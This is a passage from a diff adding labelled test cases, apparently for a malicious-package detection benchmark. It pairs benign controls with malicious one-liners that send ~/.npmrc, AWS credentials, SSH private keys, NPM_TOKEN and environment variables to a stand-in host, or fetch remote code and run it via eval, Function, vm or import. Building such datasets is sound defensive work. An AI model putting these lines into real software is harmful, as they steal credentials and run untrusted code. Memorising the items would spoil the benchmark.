+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-npmrc-upload\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "fetch('https://collector.invalid',{method:'POST',body:require('fs').readFileSync(process.env.HOME+'/.npmrc')});"
+        }
+      }
+    },
+    {
+      "id": "npmrc-upload/malicious/custom-extension-entry",
+      "family": "npmrc-upload",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "npm credentials exported versus a public config file upload.",
+      "evidence": {
+        "packageName": "challenge-npmrc-upload",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-npmrc-upload\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "fetch('https://collector.invalid',{method:'POST',body:require('fs').readFileSync(process.env.HOME+'/.npmrc')});"
+        }
+      }
+    },
+    {
+      "id": "npmrc-upload/benign/entry",
+      "family": "npmrc-upload",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "npm credentials exported versus a public config file upload.",
+      "evidence": {
+        "packageName": "challenge-npmrc-upload",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-npmrc-upload\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "fetch('https://service.invalid',{method:'POST',body:require('fs').readFileSync('./public-config.json')});"
+        }
+      }
+    },
+    {
+      "id": "npmrc-upload/benign/test-named-entry",
+      "family": "npmrc-upload",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "npm credentials exported versus a public config file upload.",
+      "evidence": {
+        "packageName": "challenge-npmrc-upload",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-npmrc-upload\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "fetch('https://service.invalid',{method:'POST',body:require('fs').readFileSync('./public-config.json')});"
+        }
+      }
+    },
+    {
+      "id": "npmrc-upload/benign/custom-extension-entry",
+      "family": "npmrc-upload",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "npm credentials exported versus a public config file upload.",
+      "evidence": {
+        "packageName": "challenge-npmrc-upload",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-npmrc-upload\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "fetch('https://service.invalid',{method:'POST',body:require('fs').readFileSync('./public-config.json')});"
+        }
+      }
+    },
+    {
+      "id": "aws-upload/malicious/entry",
+      "family": "aws-upload",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "Cloud credentials exported versus harmless data.",
+      "evidence": {
+        "packageName": "challenge-aws-upload",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-aws-upload\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "fetch('https://collector.invalid',{method:'POST',body:require('fs').readFileSync(process.env.HOME+'/.aws/credentials')});"
+        }
+      }
+    },
+    {
+      "id": "aws-upload/malicious/test-named-entry",
+      "family": "aws-upload",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "Cloud credentials exported versus harmless data.",
+      "evidence": {
+        "packageName": "challenge-aws-upload",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-aws-upload\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "fetch('https://collector.invalid',{method:'POST',body:require('fs').readFileSync(process.env.HOME+'/.aws/credentials')});"
+        }
+      }
+    },
+    {
+      "id": "aws-upload/malicious/custom-extension-entry",
+      "family": "aws-upload",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "Cloud credentials exported versus harmless data.",
+      "evidence": {
+        "packageName": "challenge-aws-upload",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-aws-upload\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "fetch('https://collector.invalid',{method:'POST',body:require('fs').readFileSync(process.env.HOME+'/.aws/credentials')});"
+        }
+      }
+    },
+    {
+      "id": "aws-upload/benign/entry",
+      "family": "aws-upload",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "Cloud credentials exported versus harmless data.",
+      "evidence": {
+        "packageName": "challenge-aws-upload",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-aws-upload\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "fetch('https://service.invalid',{method:'POST',body:require('fs').readFileSync('./public-config.json')});"
+        }
+      }
+    },
+    {
+      "id": "aws-upload/benign/test-named-entry",
+      "family": "aws-upload",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "Cloud credentials exported versus harmless data.",
+      "evidence": {
+        "packageName": "challenge-aws-upload",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-aws-upload\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "fetch('https://service.invalid',{method:'POST',body:require('fs').readFileSync('./public-config.json')});"
+        }
+      }
+    },
+    {
+      "id": "aws-upload/benign/custom-extension-entry",
+      "family": "aws-upload",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "Cloud credentials exported versus harmless data.",
+      "evidence": {
+        "packageName": "challenge-aws-upload",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-aws-upload\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "fetch('https://service.invalid',{method:'POST',body:require('fs').readFileSync('./public-config.json')});"
+        }
+      }
+    },
+    {
+      "id": "eval-fetch/malicious/entry",
+      "family": "eval-fetch",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "Remote text executed by eval versus parsed as JSON.",
+      "evidence": {
+        "packageName": "challenge-eval-fetch",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-eval-fetch\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "async function run(){ eval(await (await fetch('https://collector.invalid/code')).text()); } run();"
+        }
+      }
+    },
+    {
+      "id": "eval-fetch/malicious/test-named-entry",
+      "family": "eval-fetch",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "Remote text executed by eval versus parsed as JSON.",
+      "evidence": {
+        "packageName": "challenge-eval-fetch",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-eval-fetch\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "async function run(){ eval(await (await fetch('https://collector.invalid/code')).text()); } run();"
+        }
+      }
+    },
+    {
+      "id": "eval-fetch/malicious/custom-extension-entry",
+      "family": "eval-fetch",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "Remote text executed by eval versus parsed as JSON.",
+      "evidence": {
+        "packageName": "challenge-eval-fetch",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-eval-fetch\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "async function run(){ eval(await (await fetch('https://collector.invalid/code')).text()); } run();"
+        }
+      }
+    },
+    {
+      "id": "eval-fetch/benign/entry",
+      "family": "eval-fetch",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "Remote text executed by eval versus parsed as JSON.",
+      "evidence": {
+        "packageName": "challenge-eval-fetch",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-eval-fetch\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "async function run(){ return JSON.parse(await (await fetch('https://service.invalid/data')).text()); } run();"
+        }
+      }
+    },
+    {
+      "id": "eval-fetch/benign/test-named-entry",
+      "family": "eval-fetch",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "Remote text executed by eval versus parsed as JSON.",
+      "evidence": {
+        "packageName": "challenge-eval-fetch",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-eval-fetch\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "async function run(){ return JSON.parse(await (await fetch('https://service.invalid/data')).text()); } run();"
+        }
+      }
+    },
+    {
+      "id": "eval-fetch/benign/custom-extension-entry",
+      "family": "eval-fetch",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "Remote text executed by eval versus parsed as JSON.",
+      "evidence": {
+        "packageName": "challenge-eval-fetch",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-eval-fetch\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "async function run(){ return JSON.parse(await (await fetch('https://service.invalid/data')).text()); } run();"
+        }
+      }
+    },
+    {
+      "id": "function-fetch/malicious/entry",
+      "family": "function-fetch",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "Remote text executed with Function versus returned as text.",
+      "evidence": {
+        "packageName": "challenge-function-fetch",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-function-fetch\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "async function run(){ new Function(await (await fetch('https://collector.invalid/code')).text())(); } run();"
+        }
+      }
+    },
+    {
+      "id": "function-fetch/malicious/test-named-entry",
+      "family": "function-fetch",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "Remote text executed with Function versus returned as text.",
+      "evidence": {
+        "packageName": "challenge-function-fetch",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-function-fetch\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "async function run(){ new Function(await (await fetch('https://collector.invalid/code')).text())(); } run();"
+        }
+      }
+    },
+    {
+      "id": "function-fetch/malicious/custom-extension-entry",
+      "family": "function-fetch",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "Remote text executed with Function versus returned as text.",
+      "evidence": {
+        "packageName": "challenge-function-fetch",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-function-fetch\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "async function run(){ new Function(await (await fetch('https://collector.invalid/code')).text())(); } run();"
+        }
+      }
+    },
+    {
+      "id": "function-fetch/benign/entry",
+      "family": "function-fetch",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "Remote text executed with Function versus returned as text.",
+      "evidence": {
+        "packageName": "challenge-function-fetch",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-function-fetch\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "async function run(){ return (await fetch('https://service.invalid/data')).text(); } run();"
+        }
+      }
+    },
+    {
+      "id": "function-fetch/benign/test-named-entry",
+      "family": "function-fetch",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "Remote text executed with Function versus returned as text.",
+      "evidence": {
+        "packageName": "challenge-function-fetch",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-function-fetch\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "async function run(){ return (await fetch('https://service.invalid/data')).text(); } run();"
+        }
+      }
+    },
+    {
+      "id": "function-fetch/benign/custom-extension-entry",
+      "family": "function-fetch",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "Remote text executed with Function versus returned as text.",
+      "evidence": {
+        "packageName": "challenge-function-fetch",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-function-fetch\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "async function run(){ return (await fetch('https://service.invalid/data')).text(); } run();"
+        }
+      }
+    },
+    {
+      "id": "vm-fetch/malicious/entry",
+      "family": "vm-fetch",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "Remote code run through node:vm versus local constant arithmetic.",
+      "evidence": {
+        "packageName": "challenge-vm-fetch",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-vm-fetch\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "async function run(){ require('node:vm').runInNewContext(await (await fetch('https://collector.invalid/code')).text()); } run();"
+        }
+      }
+    },
+    {
+      "id": "vm-fetch/malicious/test-named-entry",
+      "family": "vm-fetch",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "Remote code run through node:vm versus local constant arithmetic.",
+      "evidence": {
+        "packageName": "challenge-vm-fetch",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-vm-fetch\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "async function run(){ require('node:vm').runInNewContext(await (await fetch('https://collector.invalid/code')).text()); } run();"
+        }
+      }
+    },
+    {
+      "id": "vm-fetch/malicious/custom-extension-entry",
+      "family": "vm-fetch",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "Remote code run through node:vm versus local constant arithmetic.",
+      "evidence": {
+        "packageName": "challenge-vm-fetch",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-vm-fetch\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "async function run(){ require('node:vm').runInNewContext(await (await fetch('https://collector.invalid/code')).text()); } run();"
+        }
+      }
+    },
+    {
+      "id": "vm-fetch/benign/entry",
+      "family": "vm-fetch",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "Remote code run through node:vm versus local constant arithmetic.",
+      "evidence": {
+        "packageName": "challenge-vm-fetch",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-vm-fetch\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "require('node:vm').runInNewContext('1+1',Object.create(null));"
+        }
+      }
+    },
+    {
+      "id": "vm-fetch/benign/test-named-entry",
+      "family": "vm-fetch",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "Remote code run through node:vm versus local constant arithmetic.",
+      "evidence": {
+        "packageName": "challenge-vm-fetch",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-vm-fetch\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "require('node:vm').runInNewContext('1+1',Object.create(null));"
+        }
+      }
+    },
+    {
+      "id": "vm-fetch/benign/custom-extension-entry",
+      "family": "vm-fetch",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "Remote code run through node:vm versus local constant arithmetic.",
+      "evidence": {
+        "packageName": "challenge-vm-fetch",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-vm-fetch\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "require('node:vm').runInNewContext('1+1',Object.create(null));"
+        }
+      }
+    },
+    {
+      "id": "import-fetch/malicious/entry",
+      "family": "import-fetch",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "Remote source re-encoded as a data URL and imported.",
+      "evidence": {
+        "packageName": "challenge-import-fetch",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-import-fetch\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "async function run(){ const text=await (await fetch('https://collector.invalid/code')).text(); await import('data:text/javascript,'+encodeURIComponent(text)); } run();"
+        }
+      }
+    },
+    {
+      "id": "import-fetch/malicious/test-named-entry",
+      "family": "import-fetch",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "Remote source re-encoded as a data URL and imported.",
+      "evidence": {
+        "packageName": "challenge-import-fetch",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-import-fetch\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "async function run(){ const text=await (await fetch('https://collector.invalid/code')).text(); await import('data:text/javascript,'+encodeURIComponent(text)); } run();"
+        }
+      }
+    },
+    {
+      "id": "import-fetch/malicious/custom-extension-entry",
+      "family": "import-fetch",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "Remote source re-encoded as a data URL and imported.",
+      "evidence": {
+        "packageName": "challenge-import-fetch",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-import-fetch\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "async function run(){ const text=await (await fetch('https://collector.invalid/code')).text(); await import('data:text/javascript,'+encodeURIComponent(text)); } run();"
+        }
+      }
+    },
+    {
+      "id": "import-fetch/benign/entry",
+      "family": "import-fetch",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "Remote source re-encoded as a data URL and imported.",
+      "evidence": {
+        "packageName": "challenge-import-fetch",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-import-fetch\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "async function run(){ const text=await (await fetch('https://service.invalid/data')).text(); return encodeURIComponent(text); } run();"
+        }
+      }
+    },
+    {
+      "id": "import-fetch/benign/test-named-entry",
+      "family": "import-fetch",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "Remote source re-encoded as a data URL and imported.",
+      "evidence": {
+        "packageName": "challenge-import-fetch",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-import-fetch\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "async function run(){ const text=await (await fetch('https://service.invalid/data')).text(); return encodeURIComponent(text); } run();"
+        }
+      }
+    },
+    {
+      "id": "import-fetch/benign/custom-extension-entry",
+      "family": "import-fetch",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "Remote source re-encoded as a data URL and imported.",
+      "evidence": {
+        "packageName": "challenge-import-fetch",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-import-fetch\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "async function run(){ const text=await (await fetch('https://service.invalid/data')).text(); return encodeURIComponent(text); } run();"
+        }
+      }
+    },
+    {
+      "id": "exec-secret/malicious/entry",
+      "family": "exec-secret",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "Shell command exports a credential versus invoking a local fixed command.",
+      "evidence": {
+        "packageName": "challenge-exec-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-exec-secret\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "require('child_process').execSync('curl -X POST --data '+process.env.NPM_TOKEN+' https://collector.invalid');"
+        }
+      }
+    },
+    {
+      "id": "exec-secret/malicious/test-named-entry",
+      "family": "exec-secret",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "Shell command exports a credential versus invoking a local fixed command.",
+      "evidence": {
+        "packageName": "challenge-exec-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-exec-secret\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "require('child_process').execSync('curl -X POST --data '+process.env.NPM_TOKEN+' https://collector.invalid');"
+        }
+      }
+    },
+    {
+      "id": "exec-secret/malicious/custom-extension-entry",
+      "family": "exec-secret",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "Shell command exports a credential versus invoking a local fixed command.",
+      "evidence": {
+        "packageName": "challenge-exec-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-exec-secret\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "require('child_process').execSync('curl -X POST --data '+process.env.NPM_TOKEN+' https://collector.invalid');"
+        }
+      }
+    },
+    {
+      "id": "exec-secret/benign/entry",
+      "family": "exec-secret",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "Shell command exports a credential versus invoking a local fixed command.",
+      "evidence": {
+        "packageName": "challenge-exec-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-exec-secret\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "require('child_process').execFileSync('node',['--version']);"
+        }
+      }
+    },
+    {
+      "id": "exec-secret/benign/test-named-entry",
+      "family": "exec-secret",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "Shell command exports a credential versus invoking a local fixed command.",
+      "evidence": {
+        "packageName": "challenge-exec-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-exec-secret\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "require('child_process').execFileSync('node',['--version']);"
+        }
+      }
+    },
+    {
+      "id": "exec-secret/benign/custom-extension-entry",
+      "family": "exec-secret",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "Shell command exports a credential versus invoking a local fixed command.",
+      "evidence": {
+        "packageName": "challenge-exec-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-exec-secret\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "require('child_process').execFileSync('node',['--version']);"
+        }
+      }
+    },
+    {
+      "id": "python-env/malicious/entry",
+      "family": "python-env",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "Python exports all environment variables versus a health constant.",
+      "evidence": {
+        "packageName": "challenge-python-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-python-env\", \"version\": \"1.0.0\", \"main\": \"index.py\"}",
+          "index.py": "import os, json, urllib.request\nurllib.request.urlopen('https://collector.invalid', data=json.dumps(dict(os.environ)).encode())"
+        }
+      }
+    },
+    {
+      "id": "python-env/malicious/test-named-entry",
+      "family": "python-env",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "Python exports all environment variables versus a health constant.",
+      "evidence": {
+        "packageName": "challenge-python-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-python-env\", \"version\": \"1.0.0\", \"main\": \"test/fixture.py\"}",
+          "test/fixture.py": "import os, json, urllib.request\nurllib.request.urlopen('https://collector.invalid', data=json.dumps(dict(os.environ)).encode())"
+        }
+      }
+    },
+    {
+      "id": "python-env/malicious/custom-extension-entry",
+      "family": "python-env",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "Python exports all environment variables versus a health constant.",
+      "evidence": {
+        "packageName": "challenge-python-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-python-env\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "import os, json, urllib.request\nurllib.request.urlopen('https://collector.invalid', data=json.dumps(dict(os.environ)).encode())"
+        }
+      }
+    },
+    {
+      "id": "python-env/benign/entry",
+      "family": "python-env",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "Python exports all environment variables versus a health constant.",
+      "evidence": {
+        "packageName": "challenge-python-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-python-env\", \"version\": \"1.0.0\", \"main\": \"index.py\"}",
+          "index.py": "import urllib.request\nurllib.request.urlopen('https://service.invalid', data=b'ready')"
+        }
+      }
+    },
+    {
+      "id": "python-env/benign/test-named-entry",
+      "family": "python-env",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "Python exports all environment variables versus a health constant.",
+      "evidence": {
+        "packageName": "challenge-python-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-python-env\", \"version\": \"1.0.0\", \"main\": \"test/fixture.py\"}",
+          "test/fixture.py": "import urllib.request\nurllib.request.urlopen('https://service.invalid', data=b'ready')"
+        }
+      }
+    },
+    {
+      "id": "python-env/benign/custom-extension-entry",
+      "family": "python-env",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "Python exports all environment variables versus a health constant.",
+      "evidence": {
+        "packageName": "challenge-python-env",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-python-env\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "import urllib.request\nurllib.request.urlopen('https://service.invalid', data=b'ready')"
+        }
+      }
+    },
+    {
+      "id": "python-key/malicious/entry",
+      "family": "python-key",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "Python reads and uploads a private key versus public data.",
+      "evidence": {
+        "packageName": "challenge-python-key",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-python-key\", \"version\": \"1.0.0\", \"main\": \"index.py\"}",
+          "index.py": "import os, urllib.request\ndata=open(os.path.expanduser('~/.ssh/id_rsa'),'rb').read()\nurllib.request.urlopen('https://collector.invalid',data=data)"
+        }
+      }
+    },
+    {
+      "id": "python-key/malicious/test-named-entry",
+      "family": "python-key",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "Python reads and uploads a private key versus public data.",
+      "evidence": {
+        "packageName": "challenge-python-key",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-python-key\", \"version\": \"1.0.0\", \"main\": \"test/fixture.py\"}",
+          "test/fixture.py": "import os, urllib.request\ndata=open(os.path.expanduser('~/.ssh/id_rsa'),'rb').read()\nurllib.request.urlopen('https://collector.invalid',data=data)"
+        }
+      }
+    },
+    {
+      "id": "python-key/malicious/custom-extension-entry",
+      "family": "python-key",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "Python reads and uploads a private key versus public data.",
+      "evidence": {
+        "packageName": "challenge-python-key",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-python-key\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "import os, urllib.request\ndata=open(os.path.expanduser('~/.ssh/id_rsa'),'rb').read()\nurllib.request.urlopen('https://collector.invalid',data=data)"
+        }
+      }
+    },
+    {
+      "id": "python-key/benign/entry",
+      "family": "python-key",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "Python reads and uploads a private key versus public data.",
+      "evidence": {
+        "packageName": "challenge-python-key",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-python-key\", \"version\": \"1.0.0\", \"main\": \"index.py\"}",
+          "index.py": "import urllib.request\ndata=open('public-data.json','rb').read()\nurllib.request.urlopen('https://service.invalid',data=data)"
+        }
+      }
+    },
+    {
+      "id": "python-key/benign/test-named-entry",
+      "family": "python-key",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "Python reads and uploads a private key versus public data.",
+      "evidence": {
+        "packageName": "challenge-python-key",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-python-key\", \"version\": \"1.0.0\", \"main\": \"test/fixture.py\"}",
+          "test/fixture.py": "import urllib.request\ndata=open('public-data.json','rb').read()\nurllib.request.urlopen('https://service.invalid',data=data)"
+        }
+      }
+    },
+    {
+      "id": "python-key/benign/custom-extension-entry",
+      "family": "python-key",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "Python reads and uploads a private key versus public data.",
+      "evidence": {
+        "packageName": "challenge-python-key",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-python-key\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "import urllib.request\ndata=open('public-data.json','rb').read()\nurllib.request.urlopen('https://service.invalid',data=data)"
+        }
+      }
+    },
+    {
+      "id": "shell-key/malicious/entry",
+      "family": "shell-key",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "Shell uploads a private key versus a public fixture.",
+      "evidence": {
+        "packageName": "challenge-shell-key",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-shell-key\", \"version\": \"1.0.0\", \"main\": \"index.sh\"}",
+          "index.sh": "curl -X POST --data-binary @\"$HOME/.ssh/id_rsa\" https://collector.invalid"
+        }
+      }
+    },
+    {
+      "id": "shell-key/malicious/test-named-entry",
+      "family": "shell-key",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "Shell uploads a private key versus a public fixture.",
+      "evidence": {
+        "packageName": "challenge-shell-key",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-shell-key\", \"version\": \"1.0.0\", \"main\": \"test/fixture.sh\"}",
+          "test/fixture.sh": "curl -X POST --data-binary @\"$HOME/.ssh/id_rsa\" https://collector.invalid"
+        }
+      }
+    },
+    {
+      "id": "shell-key/malicious/custom-extension-entry",
+      "family": "shell-key",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "Shell uploads a private key versus a public fixture.",
+      "evidence": {
+        "packageName": "challenge-shell-key",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-shell-key\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "curl -X POST --data-binary @\"$HOME/.ssh/id_rsa\" https://collector.invalid"
+        }
+      }
+    },
+    {
+      "id": "shell-key/benign/entry",
+      "family": "shell-key",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "Shell uploads a private key versus a public fixture.",
+      "evidence": {
+        "packageName": "challenge-shell-key",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-shell-key\", \"version\": \"1.0.0\", \"main\": \"index.sh\"}",
+          "index.sh": "curl -X POST --data-binary @public-data.json https://service.invalid"
+        }
+      }
+    },
+    {
+      "id": "shell-key/benign/test-named-entry",
+      "family": "shell-key",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "Shell uploads a private key versus a public fixture.",
+      "evidence": {
+        "packageName": "challenge-shell-key",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-shell-key\", \"version\": \"1.0.0\", \"main\": \"test/fixture.sh\"}",
+          "test/fixture.sh": "curl -X POST --data-binary @public-data.json https://service.invalid"
+        }
+      }
+    },
+    {
+      "id": "shell-key/benign/custom-extension-entry",
+      "family": "shell-key",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "Shell uploads a private key versus a public fixture.",
+      "evidence": {
+        "packageName": "challenge-shell-key",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-shell-key\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "curl -X POST --data-binary @public-data.json https://service.invalid"
+        }
+      }
+    },
+    {
+      "id": "powershell-key/malicious/entry",
+      "family": "powershell-key",
+      "label": "malicious",
+      "variant": "entry",
